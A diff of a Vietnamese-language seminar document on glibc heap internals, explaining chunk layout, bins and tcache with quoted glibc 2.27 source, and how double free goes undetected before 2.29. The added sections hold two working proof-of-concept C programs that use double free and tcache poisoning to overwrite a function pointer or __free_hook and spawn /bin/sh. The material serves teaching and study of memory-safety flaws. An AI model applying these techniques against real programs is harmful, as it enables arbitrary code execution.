@@ -87,7 +87,48 @@ Ranh giới cần tách rõ trước khi vào chi tiết: mục 2 là việc **O
 |                   |                +-------------------+
 |                   |                |     Unused...     |
 +-------------------+                +-------------------+
+
+
+An allocated chunk looks like this:
+
+    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+	    |             Size of previous chunk, if unallocated (P clear)  |
+	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+	    |             Size of chunk, in bytes                     |A|M|P|
+      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+	    |             User data starts here...                          .
+	    .                                                               .
+	    .             (malloc_usable_size() bytes)                      .
+	    .                                                               |
+nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+	    |             (size of chunk, but used for application data)    |
+	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+	    |             Size of next chunk, in bytes                |A|0|1|
+	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+
+Free chunks are stored in circular doubly-linked lists, and look like this:
+
+    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+	    |             Size of previous chunk, if unallocated (P clear)  |
+	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+    `head:' |             Size of chunk, in bytes                     |A|0|P|
+      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+	    |             Forward pointer to next chunk in list             |
+	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+	    |             Back pointer to previous chunk in list            |
+	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+	    |             Unused space (may be 0 bytes long)                .
+	    .                                                               .
+	    .                                                               |
+nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+    `foot:' |             Size of chunk, in bytes                           |
+	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+	    |             Size of next chunk, in bytes                |A|0|0|
+	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
 ```
+
 
 - `prev_size`: kích thước chunk liền trước; chỉ có ý nghĩa khi chunk đó đang rảnh (bit `P` của chunk hiện tại bằng 0).
 - `size`: kích thước chunk hiện tại, **tính cả header 0x10 byte**; luôn là bội số của 16, tối thiểu 0x20 (64-bit). 3 bit thấp là cờ trạng thái:
@@ -107,6 +148,8 @@ Hai khái niệm đi kèm (dùng lại ở các phần sau):
 
 Khi `free()` được gọi, chunk không được trả ngay cho OS mà được phân loại vào các danh sách liên kết gọi là **bin**, tuỳ theo kích thước và trạng thái.
 
+### 4.1 Tổng quan 5 loại bin
+
 | Bin | Cấu trúc | Kích thước chunk (64-bit) | Thứ tự | Đặc điểm chính |
 | --- | --- | --- | --- | --- |
 | **tcache** | liên kết đơn, riêng mỗi thread | ≤ `0x410` (dữ liệu ≤ 1032 B) | LIFO | tối đa 7 chunk/bin; không cần lock; có `key` (2.29+) và safe-linking (2.32+) |
@@ -121,6 +164,118 @@ Ghi chú:
 - Thứ tự khi free: chunk nhỏ vào tcache trước; nếu bin tcache đầy (7 chunk) mới xuống fastbin; còn lại vào unsorted bin và được phân loại về smallbin/largebin ở lần `malloc()` kế tiếp.
 - Tắt tcache khi nghiên cứu: `GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary`.
 
+### 4.2 Tcache — bản chất, lý do ra đời và cấu trúc chi tiết
+
+Bảng ở 4.1 xếp tcache là một trong 5 loại bin, nhưng nó khác biệt đủ nhiều — cả về vai trò lẫn rủi ro bảo mật (toàn bộ mục 5–6 sau này đều xoay quanh nó) — nên đáng một mục riêng, đi từ "vì sao glibc cần nó" tới "nó được ghép ra sao" bằng đúng source thật.
+
+**a) Vấn đề trước khi có tcache: một ổ khóa cho mọi thread.** Trước glibc 2.26 (2017), mọi `malloc()`/`free()` của một process — dù chạy trên bao nhiêu thread — đều phải tranh nhau một (hoặc vài) **arena**, và mỗi arena có **một mutex** bảo vệ các bin ở mục 4.1. Một chương trình đa luồng cấp phát/giải phóng liên tục nhiều object nhỏ (worker pool, bộ nhớ tạm trong hot loop...) sẽ làm các thread **khóa chờ nhau** chỉ để chèn/rút một chunk vài chục byte — chi phí đồng bộ hoá còn tốn hơn chi phí cấp phát thật. Đây là bottleneck được đo đạc thực tế trong glibc (bug 17195), và tcache (**thread cache** — đúng nghĩa đen) là bản vá.
+
+**b) Giải pháp: một cache riêng, không khóa, cho từng thread.** Ý tưởng: đặt một lớp đệm nhỏ, riêng của từng thread, nằm *trước* arena/bin ở mục 4.1. `free()` đẩy chunk vào cache của chính thread gọi nó; `malloc()` rút ra từ đó trước khi chạm tới arena. Vì cache này **không ai khác chạm được** (mỗi thread chỉ thấy cache của riêng mình, khai báo bằng từ khoá `__thread` trong C — biến toàn cục nhưng mỗi thread giữ một bản sao độc lập), toàn bộ việc đẩy/rút **không cần mutex**. Đây là nguồn gốc tốc độ — và cũng là nguồn gốc rủi ro: không khóa đồng nghĩa không có "người gác cổng" nào kiểm tra tính hợp lệ ngoài vài dòng code sẽ đọc ở mục 5.1.
+
+**c) Cấu trúc dữ liệu thật — `tcache_perthread_struct` (malloc.c:2914–2921, tag glibc-2.27):**
+
+```c
+typedef struct tcache_perthread_struct
+{
+  char counts[TCACHE_MAX_BINS];
+  tcache_entry *entries[TCACHE_MAX_BINS];
+} tcache_perthread_struct;
+
+static __thread tcache_perthread_struct *tcache = NULL;
+```
+
+Đây là **toàn bộ** bộ nhớ "sổ sách" của tcache cho một thread — không hơn:
+
+| Thành phần | Kiểu | Ý nghĩa |
+| --- | --- | --- |
+| `counts[64]` | `char[64]` | `counts[idx]` = số chunk hiện đang nằm trong bin `idx` (0–7) |
+| `entries[64]` | `tcache_entry*[64]` | `entries[idx]` = con trỏ tới chunk **đầu** danh sách liên kết đơn của bin `idx` (hoặc `NULL` nếu rỗng) |
+| `tcache` | con trỏ `__thread` | mỗi thread có một bản riêng, trỏ tới struct trên — đây là biến mà `tcache_put`/`tcache_get` (mục 5.1) đọc/ghi |
+
+`TCACHE_MAX_BINS = 64` (malloc.c:304) — tcache quản lý **64 size class** cùng lúc, mỗi class là một bin LIFO độc lập (tưởng tượng như 64 "ngăn kéo" xếp theo kích thước).
+
+```text
+tcache (con trỏ __thread, riêng cho thread hiện tại)
+  |
+  v
+tcache_perthread_struct
+ +----------------+----------------+
+ | counts[64]     | entries[64]    |
+ |----------------|----------------|
+ | idx 0  : 0     | idx 0  : NULL  |
+ | idx 1  : 0     | idx 1  : NULL  |
+ |  ...   : ...   |  ...   : ...   |
+ | idx 14 : 2     | idx 14 : *-----+--> [ h | next ] --> [ i | next ] --> NULL
+ |  ...   : ...   |  ...   : ...   |      (chunk 0x100)     (chunk 0x100)
+ | idx 63 : 0     | idx 63 : NULL  |
+ +----------------+----------------+
+
+ counts[14]=2 khớp số chunk trong list entries[14]; mỗi node là một chunk đã
+ free, 8 byte đầu user data bị mượn làm trường "next" (mục 3.1, 4.2-d).
+ Ví dụ số liệu lấy từ chuỗi free(i); free(h); ở mục 5.5.
+```
+
+**d) Chunk bên trong một bin — `tcache_entry` (malloc.c:2904–2907):** khi một chunk được free vào tcache, 16 byte đầu user data (mục 3.1) bị "mượn" làm node của linked-list:
+
+```c
+typedef struct tcache_entry
+{
+  struct tcache_entry *next;
+  /* glibc ≥ 2.29 thêm: struct tcache_perthread_struct *key; (mục 5.4, 6.3) */
+} tcache_entry;
+```
+
+`next` trỏ tới chunk kế tiếp trong **cùng bin** — danh sách liên kết **đơn** (không có `bk` quay lại như smallbin/largebin ở 4.1, vì tcache chỉ push/pop ở đầu, không cần duyệt ngược).
+
+**e) Ánh xạ kích thước → chỉ số bin — `csize2tidx` (malloc.c:308, 311):**
+
+```c
+# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)
+# define tidx2usize(idx) (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)
+```
+
+Trên 64-bit: `MINSIZE = 0x20`, `MALLOC_ALIGNMENT = 16`, `SIZE_SZ = 8`. Thử với đúng số liệu dùng ở ví dụ mục 5.5: chunk `0x100` (256) cho `idx = (256 − 32 + 15) / 16 = 14`; ngược lại `tidx2usize(14) = 14×16 + 32 − 8 = 248` — **khớp chính xác** `BUFSIZE2 = 248`. Đây là lý do `i`, `h` trong ví dụ đó luôn rơi vào cùng một `entries[14]`, bất kể thứ tự free — hai request `malloc(248)` khác nhau luôn quy về cùng một "ngăn kéo".
+
+**f) Tcache sinh ra khi nào, và tự nó tốn chỗ ở đâu — `tcache_init()` (malloc.c:2977–3002, rút gọn):** struct ở (c) không tồn tại sẵn — nó được cấp phát **lười** (lazy), đúng một lần cho mỗi thread, ngay lần `malloc()`/`free()` đầu tiên của thread đó:
+
+```c
+# define MAYBE_INIT_TCACHE() \
+  if (__glibc_unlikely (tcache == NULL)) \
+    tcache_init();
+
+static void
+tcache_init (void)
+{
+  mstate ar_ptr;
+  const size_t bytes = sizeof (tcache_perthread_struct);
+
+  arena_get (ar_ptr, bytes);          /* <- khóa arena, DUY NHẤT một lần */
+  void *victim = _int_malloc (ar_ptr, bytes);
+  if (ar_ptr != NULL)
+    __libc_lock_unlock (ar_ptr->mutex);
+
+  if (victim)
+    {
+      tcache = (tcache_perthread_struct *) victim;
+      memset (tcache, 0, sizeof (tcache_perthread_struct));
+    }
+}
+```
+
+Đọc kỹ dòng `_int_malloc (ar_ptr, bytes)`: chính struct quản lý tcache **cũng là một chunk heap bình thường**, lấy bằng con đường chậm/có khóa như mục 4.1. Đây là bằng chứng cụ thể cho lý lẽ ở (a)-(b): khóa arena chỉ bị trả giá **một lần duy nhất** lúc khởi tạo; mọi `tcache_put`/`tcache_get` sau đó (mục 5.1) không gọi `arena_get`/`__libc_lock_unlock` ở đâu cả — đúng như thiết kế. Hệ quả phụ quan trọng cho pwnable: với một binary đơn giản, đây thường là **chunk heap đầu tiên** được cấp — tiền đề cho kỹ thuật tấn công trực tiếp vào `tcache_perthread_struct` ở mục 6.5 (Tcache metadata attack).
+
+**g) Giới hạn mặc định:**
+
+| Hằng số | Giá trị mặc định | Nguồn | Ý nghĩa |
+| --- | --- | --- | --- |
+| `TCACHE_MAX_BINS` | 64 | malloc.c:304 | số size class quản lý |
+| `TCACHE_FILL_COUNT` | 7 | malloc.c:323 | số chunk tối đa mỗi bin (`counts[idx]`) |
+| `tcache_max_bytes` | 1032 B (`tidx2usize(63)`) | malloc.c:1795 | request lớn hơn mức này **không** qua tcache, đi thẳng mục 4.1 |
+
+Cả ba đều là **tunable** (`GLIBC_TUNABLES=glibc.malloc.tcache_count=...`) — không phải hằng số cứng của ABI, nên không được giả định cố định khi phân tích một binary cụ thể (một số bản phân phối mới hơn đã chỉnh các giá trị này, mục 5.4 bảng).
+
+**h) Vị trí của tcache trong đường đi `malloc()`/`free()`:** tổng kết một câu trước khi sang mục 5 — tcache là **trạm dừng đầu tiên**, không phải trạm duy nhất. `free()` thử đẩy vào tcache trước; chỉ khi bin đầy hoặc chunk quá lớn mới rơi xuống fastbin/unsorted bin ở mục 4.1 — đúng chuỗi `#if USE_TCACHE ... #endif` mà mục 5.1 sẽ trích nguyên dòng source để chỉ ra chính xác đây là nơi thiếu kiểm tra double free.
+
 ## 5. Double free
 
 **Bản chất:** `free()` được gọi nhiều hơn một lần trên cùng một vùng nhớ là hành vi không xác định (undefined behavior). Hệ quả cụ thể là làm hỏng chính các danh sách bin vừa trình bày ở mục 4 — ví dụ một chunk bị chèn hai lần vào cùng một tcache/fastbin, phá vỡ tính đúng đắn của linked list mà allocator dùng để tái sử dụng chunk. Các bước kiểm tra và đường khai thác phụ thuộc vào phiên bản glibc, loại bin, kích thước chunk và các cơ chế giảm thiểu.
@@ -129,7 +284,118 @@ Mẫu cơ bản trên fastbin (các phiên bản cũ) là `free(a); free(b); fre
 
 **Hệ quả:** lần `malloc()` kế tiếp có thể trả về chính vùng nhớ đã bị free hai lần → hai con trỏ cùng trỏ một vùng nhớ. Một con trỏ có thể dùng để ghi đè dữ liệu/metadata trong khi con trỏ kia vẫn được chương trình tin cậy sử dụng, dẫn tới giả mạo con trỏ, ghi dữ liệu tuỳ ý và chiếm luồng thực thi.
 
-### 5.1 Điều kiện phát sinh
+### 5.1 `free()` và `malloc()` nhìn từ source code glibc
+
+Trước khi nói "double free nguy hiểm", cần thấy đúng `free()`/`malloc()` làm gì bên trong. Các trích dẫn dưới đây lấy từ `malloc/malloc.c`, tag `glibc-2.27` (đại diện nhánh 2.26–2.28 dùng cho ví dụ ở mục 5.5), mirror chính thức [bminor/glibc](https://github.com/bminor/glibc/blob/glibc-2.27/malloc/malloc.c).
+
+**`free()` thật là `__libc_free` (malloc.c:3085):**
+
+```c
+void
+__libc_free (void *mem)
+{
+  mstate ar_ptr;
+  mchunkptr p;
+
+  void (*hook) (void *, const void *)
+    = atomic_forced_read (__free_hook);
+  if (__builtin_expect (hook != NULL, 0))
+    {
+      (*hook)(mem, RETURN_ADDRESS (0));
+      return;
+    }
+
+  if (mem == 0)
+    return;
+
+  p = mem2chunk (mem);
+  ...
+```
+
+Dòng đầu tiên **không phải** kiểm tra con trỏ — mà đọc một con trỏ hàm toàn cục `__free_hook` (khai báo ở malloc.c:1864: `void weak_variable (*__free_hook) (void *, const void *) = NULL;`). Nếu `__free_hook` khác `NULL`, `free()` gọi thẳng tới đó và **return ngay**, bỏ qua toàn bộ logic allocator phía dưới — kể cả `mem2chunk`. glibc 2.34 mới gỡ hẳn cơ chế này (mục 6.1); với 2.26–2.28, `__free_hook` vẫn là mục tiêu ghi đè kinh điển (Sink B, mục 5.5).
+
+**Hệ quả cụ thể nằm ở `_int_free`, nhánh tcache (malloc.c:4165–4177):**
+
+```c
+#if USE_TCACHE
+  {
+    size_t tc_idx = csize2tidx (size);
+
+    if (tcache
+	&& tc_idx < mp_.tcache_bins
+	&& tcache->counts[tc_idx] < mp_.tcache_count)
+      {
+	tcache_put (p, tc_idx);
+	return;
+      }
+  }
+#endif
+```
+
+Điều kiện duy nhất để một chunk được đẩy vào tcache là **còn chỗ trống** (`counts[tc_idx] < tcache_count`, tối đa 7 — mục 4). Không dòng nào kiểm tra "chunk này đã có trong bin chưa" — đây không phải một bước bị bỏ sót ngẫu nhiên, mà là thiết kế gốc của tcache (thêm ở 2.26) chưa tính tới double free.
+
+**`tcache_put`/`tcache_get` — cơ chế LIFO thật (malloc.c:2926–2946):**
+
+```c
+...
+typedef struct tcache_entry
+{
+  struct tcache_entry *next;
+} tcache_entry;
+...
+
+
+static __always_inline void
+tcache_put (mchunkptr chunk, size_t tc_idx)
+{
+  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
+  assert (tc_idx < TCACHE_MAX_BINS);
+  e->next = tcache->entries[tc_idx];
+  tcache->entries[tc_idx] = e;
+  ++(tcache->counts[tc_idx]);
+}
+
+static __always_inline void *
+tcache_get (size_t tc_idx)
+{
+  tcache_entry *e = tcache->entries[tc_idx];
+  assert (tc_idx < TCACHE_MAX_BINS);
+  tcache->entries[tc_idx] = e->next;
+  --(tcache->counts[tc_idx]);
+  return (void *) e;
+}
+```
+
+`tcache_put` ghi `e->next` vào **đúng 8 byte đầu user data** của chunk vừa free (mục 3.1) — đây là dòng biến user data thành con trỏ linked-list. `tcache_get` chỉ đọc lại `entries[tc_idx]` và trả về **y nguyên giá trị đó**, không kiểm tra chunk còn "sống" hay đã bị chương trình dùng việc khác. Đây là lý do một `next` bị ghi đè (tcache poisoning, mục 6.4) được `malloc()` tin tưởng tuyệt đối ở lần gọi kế tiếp.
+
+**`malloc()` thật là `__libc_malloc` (malloc.c:3027–3052):**
+
+```c
+void *
+__libc_malloc (size_t bytes)
+{
+  ...
+  void *(*hook) (size_t, const void *)
+    = atomic_forced_read (__malloc_hook);
+  if (__builtin_expect (hook != NULL, 0))
+    return (*hook)(bytes, RETURN_ADDRESS (0));
+#if USE_TCACHE
+  size_t tc_idx = csize2tidx (tbytes);
+  MAYBE_INIT_TCACHE ();
+
+  if (tc_idx < mp_.tcache_bins
+      && tcache
+      && tcache->entries[tc_idx] != NULL)
+    {
+      return tcache_get (tc_idx);
+    }
+#endif
+  ...
+```
+
+Giống `free()`, `malloc()` kiểm tra `__malloc_hook` trước (malloc.c:1866). Nhưng điểm mấu chốt cho double free: nếu bin tương ứng còn entry, `malloc()` trả ngay kết quả `tcache_get()` — **không chạm `_int_malloc`, không kiểm tra gì thêm**. Toàn bộ khoảng cách giữa một `free()` bị lỗi và một `malloc()` trả về địa chỉ tuỳ ý chỉ là dòng `tcache_get()` này — không có lớp bảo vệ nào nằm giữa.
+
+### 5.2 Điều kiện phát sinh
 
 - **Cốt lõi:** `free()` được gọi hai lần lên cùng một địa chỉ và giữa hai lần đó vùng nhớ không được cấp phát lại — tức con trỏ không được đặt về `NULL` sau `free()`, hoặc có hai con trỏ alias cùng trỏ một vùng nhớ.
 - **Các mẫu code điển hình:**
@@ -140,17 +406,17 @@ Mẫu cơ bản trên fastbin (các phiên bản cũ) là `free(a); free(b); fre
   - use-after-free (CWE-416) dẫn tới `free()` lần nữa
   - `realloc()` hỏng rồi `free()` cả con trỏ cũ lẫn mới
   - đa luồng: hai thread cùng `free()` một object, hoặc sai refcount
-- **Lọt qua allocator hay không:** không phải mọi lần free trùng đều bị chặn — phụ thuộc phiên bản glibc (mục 5.3).
+- **Lọt qua allocator hay không:** không phải mọi lần free trùng đều bị chặn — phụ thuộc phiên bản glibc (mục 5.4).
 - **Nguyên nhân gốc:** quyền sở hữu vùng nhớ không rõ ràng hoặc không được quản lý tại một chỗ duy nhất.
 
-### 5.2 CWE liên quan
+### 5.3 CWE liên quan
 
 | Mã | Tên | Liên hệ |
 | --- | --- | --- |
 | **CWE-415** | Double Free | Gọi `free()` hai lần lên cùng một địa chỉ — lỗ hổng trung tâm của seminar |
 | CWE-416 | Use After Free | Thường là tiền đề hoặc hệ quả: dùng con trỏ sau khi free rồi free lại; bản thân double free cũng tạo ra UAF (hai con trỏ cùng trỏ một vùng nhớ) |
 
-### 5.3 Free trùng có lọt qua allocator?
+### 5.4 Free trùng có lọt qua allocator?
 
 | glibc | Kiểm tra của allocator | Hành vi free trùng | Bản phân phối tiêu biểu |
 | --- | --- | --- | --- |
@@ -164,10 +430,39 @@ Ghi chú:
 
 - tcache có từ glibc 2.26, áp dụng cho chunk ≤ `0x410`, mỗi bin tối đa 7 chunk; tắt bằng `GLIBC_TUNABLES=glibc.malloc.tcache_count=0`.
 - Safe-linking chỉ mã hóa con trỏ `next` (`fd`), **không** chặn double free.
-- Thông báo abort điển hình: `double free or corruption (fasttop)` (fastbin) và `free(): double free detected in tcache 2` (tcache, 2.29+).
-- Chunk trong ví dụ bên dưới (`BUFSIZE2 = 248` → chunk `0x100`) thuộc tcache, không phải fastbin (`0x100 > 0x80`) → đây là kịch bản **tcache dup** trên glibc 2.26–2.28.
+- Thông báo abort điển hình: `double free or corruption (fasttop)` (fastbin) và `free(): double free detected in tcache 2` (tcache, 2.29+) — dẫn chứng source ngay dưới.
+- Chunk trong ví dụ ở mục 5.5 (`BUFSIZE2 = 248` → chunk `0x100`) thuộc tcache, không phải fastbin (`0x100 > 0x80`) → đây là kịch bản **tcache dup** trên glibc 2.26–2.28.
 
-### 5.4 Ví dụ minh họa
+#### Dẫn chứng source: vì sao 2.26–2.28 lọt, 2.29 chặn
+
+`tcache_put` ở glibc 2.27 (malloc.c:2926–2933, trích ở mục 5.1) không có trường nào đánh dấu "chunk đã nằm trong tcache" — `e->next` là **toàn bộ** state được ghi khi free. Từ glibc 2.29, struct `tcache_entry` (malloc.c:2904–2909) thêm trường `key`:
+
+```c
+typedef struct tcache_entry
+{
+  struct tcache_entry *next;
+  /* This field exists to detect double frees.  */
+  struct tcache_perthread_struct *key;
+} tcache_entry;
+```
+
+`tcache_put` (malloc.c:2935) gán `e->key = tcache` — con trỏ tới chính `tcache_perthread_struct` của thread hiện tại; `tcache_get` (malloc.c:2952) xoá nó về `NULL` khi chunk được cấp lại hợp lệ. `_int_free` (malloc.c:4201–4209) kiểm tra lại trường này trước khi chấp nhận một free mới:
+
+```c
+	tcache_entry *e = (tcache_entry *) chunk2mem (p);
+
+	if (__glibc_unlikely (e->key == tcache))
+	  {
+	    tcache_entry *tmp;
+	    for (tmp = tcache->entries[tc_idx]; tmp; tmp = tmp->next)
+	      if (tmp == e)
+		malloc_printerr ("free(): double free detected in tcache 2");
+	  }
+```
+
+Đây chính là nơi sinh ra thông báo abort đã nêu ở Ghi chú trên. Chú ý comment ngay trong source gốc (không phải diễn giải lại): *"we don't 100% trust it (it also matches random payload data at a 1 in 2^<size_t> chance), so verify it's not an unlikely coincidence before aborting"* — glibc tự nhận `key` có thể trùng ngẫu nhiên, nên phải duyệt lại toàn bộ list (`for` loop) để xác nhận trước khi gọi `malloc_printerr`. Đây là lý do bảng ở trên ghi "key + duyệt danh sách" chứ không chỉ "key".
+
+### 5.5 Ví dụ minh họa
 
 ```c
 #include <stdio.h>
@@ -200,14 +495,143 @@ Phân tích (trên glibc **2.26–2.28** — giai đoạn tcache chưa kiểm tr
 3. `free(h)` lần thứ hai: không có kiểm tra double free → `h` lại được đưa vào đầu bin; vì đầu bin đang là `h`, `h->next` trỏ về chính nó → danh sách thành `h → h` (self-loop), chunk `i` bị mất khỏi danh sách.
 4. Các lần `malloc(248)` tiếp theo đều trả về `h` → hai (hay nhiều) con trỏ "hợp lệ" cùng trỏ một vùng nhớ — mảnh đất cho tcache poisoning/UAF.
 
+```text
+entries[14] sau từng dòng (cùng ví dụ, cùng biến i/h/j):
+
+free(i)         entries[14] -> [i] -> NULL
+free(h)         entries[14] -> [h] -> [i] -> NULL              (LIFO: h lên đầu)
+malloc(512)->j  entries[14] -> [h] -> [i] -> NULL              (khác size class, không đụng)
+free(h) LẦN 2   tcache_put(h,14): h->next = entries[14] (đang là h, mục 4.2-f)
+                      ___
+                     v   \
+                entries[14] -> [h] -+          <- SELF-LOOP: h->next == h
+                                               chunk [i] mất liên kết (vẫn còn
+                                               trong bộ nhớ, chỉ rụng khỏi list)
+
+malloc(248) #1  trả về h; entries[14] = h->next = h (KHÔNG đổi, vì self-loop)
+malloc(248) #2  trả về h LẦN NỮA -> hai con trỏ a, b cùng trỏ 1 vùng nhớ = UAF
+```
+
 Trên các phiên bản khác:
 
 - **glibc ≤ 2.25** (chưa có tcache): hai chunk `0x100` rơi vào unsorted bin và hợp nhất với nhau/top, nên sau `malloc(512)` thì `h` nằm giữa vùng dữ liệu của `j`; `free(h)` lần hai đọc metadata rác và thường abort. Muốn minh họa trên các bản này, dùng mẫu fastbin dup với chunk ≤ `0x80`.
 - **glibc ≥ 2.29**: `free(h)` lần hai bị chặn ngay → `free(): double free detected in tcache 2`.
 
+#### Sink A — ghi đè con trỏ hàm tự định nghĩa (không cần biết libc)
+
+Mở rộng trực tiếp ví dụ trên: thêm một struct có con trỏ hàm, cùng size class `0x100` với `i`/`h`, rồi dùng chính `h` (đang dangling sau double free) để ghi tay giá trị `next` — đây là bước **tcache poisoning** (mục 6.4), thay cho self-loop ngẫu nhiên ở trên.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define BUFSIZE1    512
+#define BUFSIZE2    ((BUFSIZE1 / 2) - 8)   /* 248 → chunk 0x100 → tcache */
+
+struct target {
+    void (*action)(void);                 /* con trỏ hàm nằm đầu struct */
+    char  pad[BUFSIZE2 - sizeof(void *)];
+};                                         /* sizeof == BUFSIZE2: cùng size class với i/h */
+
+void safe(void) { puts("[safe] khong co gi xay ra"); }
+void win(void)  { puts("[win] chiem duoc luong thuc thi qua tcache poisoning"); system("/bin/sh"); }
+
+int main(int argc, char **argv) {
+    struct target *t = malloc(sizeof(struct target));   /* chunk 0x100, cùng bin với i/h */
+    t->action = safe;
+
+    char *i = (char *) malloc(BUFSIZE2);
+    char *h = (char *) malloc(BUFSIZE2);
+
+    free(i);    /* tcache[0x100]: i      */
+    free(h);    /* tcache[0x100]: h -> i */
+
+    char *j = (char *) malloc(BUFSIZE1);
+    strncpy(j, argv[1], BUFSIZE1 - 1);
+
+    free(h);    /* double free: 2.26-2.28 khong check -> h->next = h (self-loop) */
+
+    *(struct target **) h = t;   /* UAF write qua con trỏ h còn dangling:
+                                     sửa h->next từ "h" thành "&t" (poisoning) */
+
+    malloc(BUFSIZE2);                       /* tiêu thụ entry bị poison, trả về h */
+    struct target *fake = malloc(BUFSIZE2); /* trả về CHÍNH t */
+
+    fake->action = win;   /* ghi đè con trỏ hàm của t qua "fake" */
+    t->action();          /* code gốc gọi qua t như bình thường -> win() */
+    return 0;
+}
+```
+
+```text
+Trước poisoning (self-loop, thừa kế từ sơ đồ mục 5.5):
+  entries[14] -> [h] -+   (h->next == h)
+             ^_________|
+
+UAF write qua con trỏ h còn dangling:  *(struct target **) h = t;
+  entries[14] -> [h] --next--> [ t ]            <- next bị đổi hướng sang t
+                               (chunk KHÔNG được free, vẫn "sống" trong app)
+
+malloc(BUFSIZE2) #1   trả về h; entries[14] = h->next = t
+malloc(BUFSIZE2) #2   trả về CHÍNH t  <- "arbitrary allocation" (mục 6.2),
+                       gán cho biến "fake"
+
+fake->action = win;   -------> ghi đè t->action (cùng 1 vùng nhớ, 2 tên gọi)
+t->action();          -------> gọi qua t như bình thường -> thực thi win()
+```
+
+Không cần biết địa chỉ `t` tuyệt đối hay tắt ASLR — `t` đã nằm sẵn trong tay chương trình (biến local), nên không cần leak gì cả. Đây là lý do mục 7.1 liệt kê "chunk mục tiêu overlap với structure có giá trị khai thác" là điều kiện riêng, độc lập với điều kiện "biết địa chỉ heap" (chỉ cần khi mục tiêu nằm ngoài tầm biết trước, như Sink B).
+
+#### Sink B — ghi đè `__free_hook` → `system()` (RCE)
+
+Thay mục tiêu bằng `__free_hook` (malloc.c:1864, mục 5.1) — biến toàn cục trong libc, không nằm trong tay chương trình, nên **cần biết địa chỉ tuyệt đối** của nó trước (ASLR, mục 7.2):
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define BUFSIZE1    512
+#define BUFSIZE2    ((BUFSIZE1 / 2) - 8)   /* 248 → chunk 0x100 → tcache */
+
+extern void (*__free_hook) (void *, const void *);  /* tồn tại trong glibc < 2.34, mục 6.1 */
+
+int main(int argc, char **argv) {
+    char *i = (char *) malloc(BUFSIZE2);
+    char *h = (char *) malloc(BUFSIZE2);
+
+    free(i);    /* tcache[0x100]: i      */
+    free(h);    /* tcache[0x100]: h -> i */
+
+    char *j = (char *) malloc(BUFSIZE1);
+    strncpy(j, argv[1], BUFSIZE1 - 1);
+
+    free(h);    /* double free -> h->next = h (self-loop) */
+
+    *(void **) h = (void *) &__free_hook;   /* poisoning: next -> &__free_hook
+                                                (cần địa chỉ tuyệt đối, xem mục 7.2) */
+
+    malloc(BUFSIZE2);                                 /* tiêu thụ entry poison, trả về h */
+    void **hook_slot = (void **) malloc(BUFSIZE2);    /* trả về ĐÚNG &__free_hook */
+
+    *hook_slot = (void *) system;    /* __free_hook = &system */
+
+    free("/bin/sh");   /* __libc_free thay logic thực bởi __free_hook(ptr, ...)
+                           == system("/bin/sh") — xem dòng hook check ở mục 5.1 */
+    return 0;
+}
+```
+
+`free("/bin/sh")` an toàn ở đây vì `__libc_free` kiểm tra `__free_hook` **trước** khi chạm tới `mem2chunk` (mục 5.1) — chuỗi `"/bin/sh"` không bao giờ bị hiểu như một chunk thật. Chữ ký hook `(void *, const void *)` khác `system(const char *)`, nhưng ABI x86-64 truyền đối số đầu qua `rdi` và `system()` chỉ đọc đối số đầu, nên vẫn chạy đúng.
+
+So sánh hai sink: Sink A không cần leak gì (mục tiêu đã trong tay); Sink B cần biết `&__free_hook` tuyệt đối — nếu ASLR đang bật phải leak libc base trước (mục 7.2), nếu không sẽ segfault hoặc trúng `malloc(): unaligned tcache chunk detected` thay vì shell.
+
+Cả hai PoC chỉ đi hết được chuỗi trên glibc 2.26–2.28 thật (ví dụ container `ubuntu:18.04`/glibc 2.27). Trên glibc ≥ 2.29, dòng `*(...) h = ...` vẫn ghi được (UAF write không bị chặn), nhưng `free(h)` lần hai đã abort ngay từ `malloc.c:4201` (mục 5.4) — không bao giờ tới được bước poisoning. Trên glibc ≥ 2.34, dòng `extern void (*__free_hook)...` ở Sink B sẽ lỗi linker "undefined reference" vì symbol đã bị gỡ (mục 6.1).
+
 ## 6. Tcache poisoning
 
